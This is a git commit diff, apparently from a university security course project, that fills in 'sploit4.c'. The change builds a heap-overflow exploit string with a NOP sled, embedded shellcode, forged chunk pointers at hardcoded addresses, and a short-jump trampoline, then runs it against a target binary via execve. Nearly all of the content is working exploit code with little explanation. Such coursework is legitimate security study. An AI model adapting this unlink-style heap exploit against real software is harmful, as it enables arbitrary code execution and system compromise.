9bff0cdbe93a6b8ab0382d85492d0ab84e21c057
codeyq <chn_yuqian@hotmail.com>
2018-04-11 21:41:40 -0700

    [proj1] sploit4

--- proj1/sploits/sploit4.c
+++ proj1/sploits/sploit4.c
@@ -9,7 +9,20 @@
 
 int main(void)
 {
-  char *args[] = { TARGET, "hi there", NULL };
+  char sploitstring[1024];
+  memset(sploitstring, '\x90', sizeof(sploitstring));
+  sploitstring[sizeof(sploitstring) - 1] = 0;
+  memcpy(sploitstring + 32, shellcode, strlen(shellcode));
+  // p = 0x804a068
+  // q = 0x804a268
+  // q.bk = eip + 1
+  // q.bk.fd = p
+  *(int *)(sploitstring + 512 - 8) = 0x0804a068;
+  *(int *)(sploitstring + 512 - 4) = 0xbffffa70;
+  *(int *)(sploitstring + 4) = -1;
+  *(short *)(sploitstring) = 0x0ceb;
+
+  char *args[] = { TARGET, sploitstring, NULL };
   char *env[] = { NULL };
 
   execve(TARGET, args, env);
